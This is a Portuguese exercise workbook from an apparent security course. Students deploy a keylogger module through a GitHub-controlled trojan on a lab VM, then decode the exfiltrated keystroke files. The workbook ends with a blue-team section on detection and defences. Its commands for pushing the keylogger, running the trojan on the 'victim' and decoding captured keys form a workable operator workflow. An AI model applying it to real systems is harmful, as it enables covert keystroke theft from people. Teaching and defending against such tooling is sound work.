# Caderno de Exercícios Práticos: 03 Integração (Completo)

**Material de Referência:** `02_GUIA_PRATICO_COMPLETO.md`
**Scripts Base:** `modules/keylogger.py`, `git_trojan_moderno.py`, `decodificar_resultado.py`
**Alvo:** Repo privado `bhtprojan` + VM Windows

---

## 🎯 Objetivo Desta Lista

Praticar a integração real de ponta a ponta:
* Publicação de módulo + config.
* Diagnóstico de `GitImporter` antigo vs moderno.
* Coleta e decodificação de `.data`.
* OPSEC e visão Blue Team.

---

## Exercício 2.1 — Publicar Keylogger e Confirmar Beacon

### Enunciado
Suba `modules/keylogger.py` adaptado + `abc.json` com 3 módulos e confirme o beacon puxando os 3.

### Tarefas
1. `git add modules/keylogger.py config/abc.json && git commit -m "Adds keylogger module" && git push`.
2. Na VM, rode `python git_trojan.py` (ou `git_trojan_moderno.py` em 3.12+).
3. Confirme `[*] Attempting to retrieve keylogger` e digite por 2 min (com `TIMEOUT = 120` temporário).

### Resolução Sugerida
```bash
git push origin master
# na vítima:
python git_trojan_moderno.py
```

---

## Exercício 2.2 — Decodificando `.data` com Log + Timestamp

### Enunciado
Após o ciclo, decodifique o resultado com `decodificar_resultado.py` e confira teclas + `[PASTE]`.

### Tarefas
1. `git pull` e liste `data/abc/`.
2. Rode `python decodificar_resultado.py data/abc/<arquivo>.data`.
3. Confira que o texto contém processo/janela + teclas digitadas.

### Resolução Sugerida
```python
# decodificar_resultado.py (trecho):
import base64, sys
from pathlib import Path
raw = Path(sys.argv[1]).read_bytes()
print(base64.b64decode(raw).decode('utf-8', errors='replace'))
```
```bash
cat data/abc/xxx.data | base64 -d
```

---

## Exercício 2.3 — Interrupção Segura + Métricas (`Ctrl+C`)

### Enunciado
Como o trojan dorme horas, o operador precisa interromper com `Ctrl+C` sem perder métricas. Adicione `try/except KeyboardInterrupt` como no material de brute force.

### Tarefas
1. Envolva o `while True` do `run()` em `try`.
2. No `except KeyboardInterrupt`, exiba ciclos concluídos e tempo total com `time.time()`.
3. Teste com ciclo curto (sleep de 10s temporário).

### Resolução Sugerida
```python
inicio = time.time()
ciclos = 0
try:
    while True:
        config = self.get_config()
        # ... threads ...
        ciclos += 1
        time.sleep(30 * 60)
except KeyboardInterrupt:
    print(f"\n[!] Interrompido. Ciclos: {ciclos}, tempo: {time.time()-inicio:.1f}s.")
```

---

## Exercício 2.4 — OPSEC + Blue Team da Integração

### Enunciado
Analise a integração do ponto de vista do defensor da rede que vê HTTPS para `api.github.com`.

### Tarefas
1. Liste 3 artefatos: `create_file` fora de horário, `.data` periódicos de 30m–3h, `User-Agent: github3.py`.
2. Proponha 2 defesas: allowlist de GitHub por grupo + token com expiração + revogação pós-aula.
3. Responda: por que compilar com PyInstaller ajuda o atacante mas ajuda o defensor? (resposta: sem Python na vítima, mas `.exe` de 7 MB com assinatura rara é fácil de bloquear por hash/AppLocker).

### Resposta Sugerida para Discussão em Sala
1. **Allowlist + TLS inspection com exceção:** Só grupo de dev acessa `api.github.com`; estação comum bloqueada.
2. **GitHub audit log + expiração:** Alerta em `repo.create_file` + token de 8h revogado ao fim do lab + repo privado com branch protection.
